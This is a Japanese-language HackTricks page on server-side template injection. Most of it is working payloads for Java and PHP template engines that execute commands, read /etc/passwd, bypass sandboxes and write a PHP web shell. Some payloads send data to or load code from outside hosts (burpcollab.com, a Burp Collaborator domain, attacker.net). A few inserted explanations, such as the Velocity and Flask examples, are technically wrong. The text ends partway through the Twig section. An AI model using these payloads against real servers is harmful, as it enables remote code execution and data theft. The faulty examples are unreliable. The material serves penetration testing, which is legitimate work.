# SSTI（サーバーサイドテンプレートインジェクション）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。この大会は、技術的な知識を促進することを目的としており、あらゆる分野の技術とサイバーセキュリティの専門家が集まる活気のある場です。

{% embed url="https://www.rootedcon.com/" %}

## サーバーサイドテンプレートインジェクションとは何ですか？

サーバーサイドテンプレートインジェクションは、攻撃者がネイティブなテンプレート構文を使用して悪意のあるペイロードをテンプレートに注入し、それがサーバーサイドで実行される場合に発生します。

**テンプレートエンジン**は、**固定の**テンプレートと**不安定な**データを組み合わせて**ウェブページを生成**するために設計されています。サーバーサイドテンプレートインジェクション攻撃は、ユーザーの入力がデータとして渡されるのではなく、直接テンプレートに連結される場合に発生します。これにより、攻撃者は任意のテンプレートディレクティブを注入してテンプレートエンジンを操作し、しばしばサーバーの**完全な制御を取得**することができます。

脆弱なコードの例は以下の通りです：
```php
$output = $twig->render("Dear " . $_GET['name']);
```
前の例では、**テンプレートの一部**自体が`GET`パラメータ`name`を使用して**動的に生成**されています。テンプレートの構文はサーバーサイドで評価されるため、攻撃者は`name`パラメータ内にサーバーサイドテンプレートインジェクションペイロードを配置することができます。以下のようになります：
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## サーバーサイドテンプレートインジェクション攻撃の構築

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### 検出

脆弱性を悪用するための最初のステップは、それを見つけることです。もっとも簡単な初期アプローチは、テンプレート式でよく使用される特殊文字のシーケンスを注入して、テンプレートを**fuzzing**することです。たとえば、ポリグロットの`${{<%[%'"}}%\`などです。\
サーバーが脆弱かどうかを確認するためには、パラメータに**通常のデータ**を入力した場合と**与えられたペイロード**のレスポンスの**違いを見つける**必要があります。\
もし**エラーが発生**した場合、サーバーが脆弱であることや、どの**エンジンが実行**されているかを簡単に特定することができます。また、与えられたペイロードが**反映されていない**場合や、レスポンスに**一部の文字が欠けている**場合も、脆弱なサーバーを見つけることができます。

**検出 - 平文コンテキスト**

与えられた入力は、レスポンスに**レンダリングおよび反映**されています。これは簡単に[**XSS**](../xss-cross-site-scripting/)の脆弱性と間違えられることがありますが、テンプレート式内で**数学演算**を設定してみると区別することができます。
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**検出 - コードの文脈**

これらの場合、**ユーザーの入力**は**テンプレート式**内に配置されています。
```python
engine.render("Hello {{"+greeting+"}}", data)
```
アクセスするURLは次のようになります：`http://vulnerable-website.com/?greeting=data.username`

もし**`greeting`**パラメータを**別の値**に**変更**すると、**レスポンスにはユーザー名が含まれません**が、`http://vulnerable-website.com/?greeting=data.username}}hello`のようなアクセスをすると、**レスポンスにはユーザー名が含まれます**（クロージングテンプレート式の文字が**`}}`**である場合）。\
これらのテスト中に**エラー**が発生した場合、サーバーが脆弱であることがより簡単に見つけられます。

### 特定

テンプレートインジェクションの可能性を検出したら、次のステップはテンプレートエンジンを特定することです。\
テンプレート言語は非常に多くありますが、多くの言語はHTMLの文字と衝突しないように特別に選ばれた非常に似た構文を使用しています。

もし運が良ければ、サーバーが**エラーを表示**している場合、エラーの中から使用されている**エンジン**を見つけることができます。エラーを引き起こす可能性のあるいくつかのペイロードは次のとおりです：

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

それ以外の場合は、**異なる言語固有のペイロード**を手動でテストし、テンプレートエンジンによってどのように解釈されるかを調査する必要があります。異なるテンプレートエンジンの構文を使用して任意の数学演算を注入し、それが正常に評価されるかどうかを観察することが一般的な方法です。このプロセスを支援するために、次のような意思決定ツリーを使用することができます：

![](<../../.gitbook/assets/image (272).png>)

### 悪用

**読む**

テンプレートインジェクションを見つけ、テンプレートエンジンを特定した後の最初のステップは、ドキュメントを読むことです。興味のある主な領域は次のとおりです：

* 基本構文をカバーする「テンプレート作成者向け」セクション。
* 「セキュリティに関する考慮事項」- テストしているアプリを開発した人はおそらくこれを読んでいない可能性があり、有用なヒントが含まれているかもしれません。
* 組み込みメソッド、関数、フィルタ、変数のリスト。
* 拡張機能/プラグインのリスト - いくつかはデフォルトで有効になっているかもしれません。

**探索**

脆弱性が見つからない場合、次のステップは**環境を探索**して、**アクセスできるもの**を正確に把握することです。テンプレートエンジンが提供する**デフォルトのオブジェクト**と、開発者がテンプレートに渡す**アプリケーション固有のオブジェクト**の両方を見つけることができます。多くのテンプレートシステムは、スコープ内のすべてを含む「self」または名前空間オブジェクトを公開し、オブジェクトの属性とメソッドをリストするための慣用的な方法を提供します。

組み込みのselfオブジェクトがない場合は、[SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)とBurp Intruderのワードリストコレクションを使用して変数名をブルートフォースする必要があります。

開発者が提供したオブジェクトには、特に機密情報が含まれる可能性が高く、アプリケーション内の異なるテンプレートごとに異なる場合があるため、このプロセスは理想的には個々の異なるテンプレートに適用する必要があります。

**攻撃**

この時点で、利用可能な攻撃対象について**明確なアイデア**を持ち、各関数を検証して脆弱性を悪用するための従来のセキュリティ監査手法を実行できるはずです。これは、より広範なアプリケーションの文脈でアプローチすることが重要です - 一部の関数はアプリケーション固有の機能を悪用するために使用できます。以下の例では、テンプレートインジェクションを使用して任意のオブジェクト作成、任意のファイルの読み書き、リモートファイルのインクルード、情報の漏洩、特権の昇格の脆弱性をトリガーします。

## ツール

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## Exploits

### Generic

この**ワードリスト**には、以下のエンジンの環境で定義された**変数**が含まれています：

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - 基本的なインジェクション**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - システムの環境変数を取得する**

Server-Side Template Injection (SSTI)は、Webアプリケーションの脆弱性の一つであり、攻撃者がテンプレートエンジンの脆弱性を悪用して、サーバー上で任意のコードを実行できる可能性があります。

JavaでSSTIを実行するためには、以下の手順を実行します。

1. テンプレートエンジンの脆弱性を特定します。これには、テンプレートエンジンのバージョンや設定、ドキュメントなどの情報を収集することが含まれます。

2. テンプレートエンジンの制御文字を特定します。これには、テンプレートエンジンのドキュメントやソースコードを調査することが含まれます。

3. インジェクションポイントを特定します。これには、テンプレート内の変数や制御構造を調査することが含まれます。

4. インジェクションペイロードを作成します。これには、Javaのコードを使用してシステムの環境変数を取得するコードを作成することが含まれます。

以下は、Javaでシステムの環境変数を取得するためのコードの例です。

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            System.out.println(key + " = " + env.get(key));
        }
    }
}
```

このコードは、`System.getenv()`メソッドを使用してシステムの環境変数を取得し、それらを出力します。

このコードをテンプレートエンジンのインジェクションポイントに挿入することで、攻撃者はサーバー上のシステムの環境変数を取得することができます。

注意: SSTIは違法行為です。この情報はセキュリティテストやペネトレーションテストの目的でのみ使用してください。
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwdの取得**

Server-side Template Injection（SSTI）は、Webアプリケーションの脆弱性の一つであり、攻撃者がテンプレートエンジンを通じて任意のコードを実行できる可能性があります。このテクニックを使用して、JavaでのSSTIの一例を紹介します。

以下のコードは、JavaのVelocityテンプレートエンジンを使用している場合のSSTIの例です。

```java
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

import java.io.StringWriter;

public class SSTIExample {
    public static void main(String[] args) {
        Velocity.init();

        VelocityContext context = new VelocityContext();
        context.put("user", System.getProperty("user.name"));

        StringWriter writer = new StringWriter();
        Velocity.evaluate(context, writer, "", "file:///etc/passwd");

        System.out.println(writer.toString());
    }
}
```

このコードでは、Velocityテンプレートエンジンを使用して`/etc/passwd`ファイルを取得しています。`VelocityContext`オブジェクトに`user`というキーで現在のユーザー名を設定し、`Velocity.evaluate()`メソッドを使用してテンプレートを評価しています。

このコードを実行すると、`/etc/passwd`ファイルの内容が出力されます。ただし、このコードは単なる例であり、実際の攻撃にはさらなる手法やコードが必要です。

このようなSSTIの脆弱性を悪用することは違法ですので、正当な目的のためにのみ使用してください。
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

あなたは[https://try.freemarker.apache.org](https://try.freemarker.apache.org)でペイロードを試すことができます。

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - サンドボックス回避**

⚠️ 2.3.30未満のFreemarkerバージョンでのみ機能します。
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**詳細情報**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)のFreeMarkerセクションで詳細を確認してください。
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)を参照してください。

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**詳細情報**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)のVelocityセクション
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf（Java）

SSTIの典型的なテスト式は`${7*7}`です。この式はThymeleafでも機能します。リモートコード実行を達成したい場合は、次のいずれかのテスト式を使用できます。

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

ただし、前述したように、式は特別なThymeleaf属性でのみ機能します。テンプレートの別の場所で式を使用する必要がある場合、Thymeleafは_expression inlining_をサポートしています。この機能を使用するには、式を`[[...]]`または`[(...)]`の内部に配置する必要があります（特殊な記号をエスケープする必要があるかどうかに応じて、どちらかを選択します）。したがって、Thymeleafの単純なSSTI検出ペイロードは`[[${7*7}]]`となります。

ただし、上記の検出ペイロードが機能する可能性は非常に低いです。SSTIの脆弱性は通常、テンプレートがコード内で動的に生成される場合に発生します。デフォルトでは、Thymeleafはそのような動的に生成されたテンプレートを許可せず、すべてのテンプレートは事前に作成する必要があります。したがって、開発者が文字列からテンプレートを「即座に」作成したい場合、独自のTemplateResolverを作成する必要があります。これは可能ですが、非常にまれです。

Thymeleafテンプレートエンジンのドキュメントを詳しく見てみると、_**expression preprocessing**_という興味深い機能があります。ダブルアンダースコア（`__...__`）で囲まれた式は、事前処理され、その結果が通常の処理中に式の一部として使用されます。以下は、Thymeleafドキュメントの公式な例です：
```java
#{selection.__${sel.code}__}
```
**脆弱な例**

The following example demonstrates a vulnerable server-side template injection (SSTI) scenario:

以下の例は、サーバーサイドテンプレートインジェクション（SSTI）の脆弱なシナリオを示しています。

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    template = '''
    <h1>Welcome, {{ name }}!</h1>
    '''
    return render_template_string(template, name=name)

if __name__ == '__main__':
    app.run()
```

In this example, a Flask web application is created with a single route ("/") that renders a template. The template includes a variable `name` that is rendered using the `render_template_string` function. The value of the `name` variable is obtained from the query parameters of the request.

この例では、Flaskウェブアプリケーションが作成され、単一のルート（"/"）がテンプレートをレンダリングします。テンプレートには、`render_template_string`関数を使用してレンダリングされる`name`変数が含まれています。`name`変数の値は、リクエストのクエリパラメータから取得されます。

An attacker can exploit this vulnerability by injecting malicious template code into the `name` parameter. For example, an attacker can craft a payload that executes arbitrary commands on the server:

攻撃者は、`name`パラメータに悪意のあるテンプレートコードをインジェクションすることで、この脆弱性を悪用することができます。たとえば、攻撃者は、サーバー上で任意のコマンドを実行するペイロードを作成することができます。

```
http://example.com/?name={{7*7}}
```

In this case, the payload `{{7*7}}` is injected into the `name` parameter. The server evaluates the template and renders the result, which is `49`. As a result, the attacker can execute arbitrary code on the server.

この場合、ペイロード`{{7*7}}`が`name`パラメータにインジェクションされます。サーバーはテンプレートを評価し、結果である`49`をレンダリングします。結果として、攻撃者はサーバー上で任意のコードを実行できます。
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**詳細情報**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework（Java）
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**フィルターをバイパスする**

複数の変数式を使用することができます。`${...}`が機能しない場合は、`#{...}`、`*{...}`、`@{...}`、または`~{...}`を試してみてください。

* `/etc/passwd`を読み取る
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* ペイロード生成のためのカスタムスクリプト
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**詳細情報**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Springビュー操作（Java）
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble（Java）

* `{{ someString.toUPPERCASE() }}`

Pebbleの古いバージョン（バージョン3.0.9未満）：
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
新しいバージョンのPebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava（Java）

Jinjava is a Java-based template engine that allows for server-side template injection (SSTI) attacks. It is commonly used in web applications built with Java frameworks such as Spring Boot.

#### Exploiting Jinjava SSTI

To exploit Jinjava SSTI, you need to identify the injection point in the application where user-supplied input is directly inserted into the template. This can typically be found in places where the application dynamically generates HTML or other types of documents.

Once you have identified the injection point, you can craft a payload that will be executed as code on the server. This payload can include Jinjava expressions and statements to perform various actions, such as accessing sensitive data, executing system commands, or even gaining remote code execution.

#### Payload Examples

Here are some examples of payloads that can be used to exploit Jinjava SSTI:

1. Accessing System Properties:
```
{{''.getClass().forName('java.lang.System').getDeclaredMethod('getProperties').setAccessible(true).invoke(null)}}
```

2. Executing System Commands:
```
{{''.getClass().forName('java.lang.Runtime').getRuntime().exec('COMMAND')}}
```

3. Reading Files:
```
{{''.getClass().forName('java.nio.file.Files').readAllBytes('FILE_PATH'.getClass().forName('java.nio.file.Paths').get('FILE_PATH'))}}
```

#### Protection and Prevention

To protect against Jinjava SSTI attacks, it is important to properly validate and sanitize user input before inserting it into templates. Input validation should include checking for malicious characters and patterns that could be used to inject Jinjava code.

Additionally, it is recommended to use a Content Security Policy (CSP) to restrict the execution of inline scripts and prevent the loading of external scripts from untrusted sources.

#### References

- [Jinjava GitHub Repository](https://github.com/HubSpot/jinjava)
- [OWASP Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Server_Side_Template_Injection)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjavaは、Hubspotによって開発されたオープンソースのプロジェクトで、[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)で利用可能です。

**Jinjava - コマンドの実行**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)によって修正されました。
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**詳細情報**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ステートメントの区切り記号
* `{{ }}` 式の区切り記号
* `{# #}` コメントの区切り記号
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest" を検索し、[Github上のJinjavaプロジェクト](https://github.com/HubSpot/jinjava/)を発見しました。
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**詳細情報**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### 式言語 - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

ELは、プレゼンテーション層（Webページ）とアプリケーションロジック（管理されたBean）の間で通信を可能にする重要なメカニズムを提供します。ELは、JavaServer Facesテクノロジー、JavaServer Pages（JSP）テクノロジー、およびJava EEのコンテキストと依存性の注入（CDI）など、**いくつかのJavaEEテクノロジー**で使用されています。\
ELインタプリタの**悪用**について詳しくは、次のページを参照してください：

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

このセキュリティマネージャーのバイパスは、この[**解説記事**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)から取得されました。
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。**技術的な知識の促進を使命として**、この会議はあらゆる分野の技術とサイバーセキュリティの専門家の熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**詳細情報**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)のSmartyセクションで詳細を確認してください。
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)を参照してください。

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = エラー`
* `{{foobar}} 何も表示されません`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
